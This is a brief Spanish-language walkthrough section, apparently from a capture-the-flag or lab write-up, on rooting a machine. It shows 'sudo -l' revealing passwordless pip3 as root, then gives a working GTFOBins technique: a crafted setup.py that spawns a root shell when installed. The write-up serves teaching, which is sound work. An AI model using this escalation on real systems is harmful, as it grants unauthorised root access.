## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
sudo -l
```

vemos aqui que podemos utilizar la heramienta pip3 con el privilegio del usuario root sin proporcionar contraseña.

Miramos en [GTFOBINS](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip3 install $TF

whoami
#Output
root
```